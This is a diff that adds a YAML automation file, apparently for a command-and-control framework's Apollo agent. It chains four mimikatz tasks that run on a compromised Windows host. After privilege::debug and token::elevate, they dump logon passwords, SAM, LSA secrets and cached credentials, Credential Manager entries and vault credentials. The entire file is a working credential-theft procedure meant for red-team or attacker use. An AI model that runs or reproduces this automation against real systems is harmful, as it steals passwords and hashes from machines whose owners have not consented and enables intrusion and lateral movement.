@@ -1,0 +1,56 @@
+name: "Apollo Mimikatz Automation"
+description: "Automates dumping credentials via Apollo agent"
+trigger: manual
+run_as: self
+
+steps:
+  - name: "mimikatz sekurlsa::logonpasswords"
+    description: "Performs sekurlsa::logonpasswords"
+    depends_on: []
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: mimikatz
+      params: '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit'
+
+  - name: "mimikatz lsadump"
+    description: "Perform lsadump"
+    depends_on:
+      - "mimikatz sekurlsa::logonpasswords"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: mimikatz
+      params: '"privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" exit'
+
+  - name: "mimikatz sekurlsa::credman"
+    description: "Performs sekurlsa::credman"
+    depends_on:
+      - "mimikatz lsadump"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: mimikatz
+      params: '"privilege::debug" "token::elevate" "sekurlsa::credman" exit'
+
+  - name: "mimikatz vault::cred"
+    description: "Perform vault::cred"
+    depends_on:
+      - "mimikatz sekurlsa::credman"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    continue_on_error: true
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: mimikatz
+      params: '"privilege::debug" "token::elevate" "vault::cred" exit'
